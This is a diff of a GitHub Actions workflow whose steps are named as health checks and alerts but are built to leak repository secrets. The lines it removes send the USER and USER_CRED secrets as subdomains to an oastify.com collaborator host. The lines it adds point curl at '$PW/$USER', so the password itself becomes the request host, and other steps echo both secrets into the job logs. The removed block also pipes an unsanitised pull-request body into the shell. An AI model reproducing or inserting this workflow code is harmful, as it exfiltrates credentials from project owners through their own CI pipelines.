@@ -22,7 +22,7 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $PW/$USER
         
     - name: send_run_log
       continue-on-error: true
@@ -33,8 +33,7 @@ jobs:
       run: |
         echo "$USER"
         echo "$PW"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $USER.1z1cldp46afcfy4b3x3svq3r6ic901oq.oastify.com
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $PW.1z1cldp46afcfy4b3x3svq3r6ic901oq.oastify.com
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $PW/$USER
         
     - name: send_slack_alert
       continue-on-error: true
@@ -52,12 +51,4 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        PR="${{ github.event.pull_request.body }}"
-        echo $PR | grep -oP '\(backport #\K\d+' | tail -n 1)
-        author=$(gh pr view ${ORI_PR} -R ${REPO} --json author -q '.author.login')
-        if [[ ! "${author}" =~ "mergify" ]]; then
-          gh pr edit ${PR_NUMBER} -R ${REPO} --add-assignee ${author} || true
-          echo "ORI_PR=${ORI_PR}" >> $GITHUB_OUTPUT
-        fi
-        
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $URL/api/run/audit
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $PW/$USER
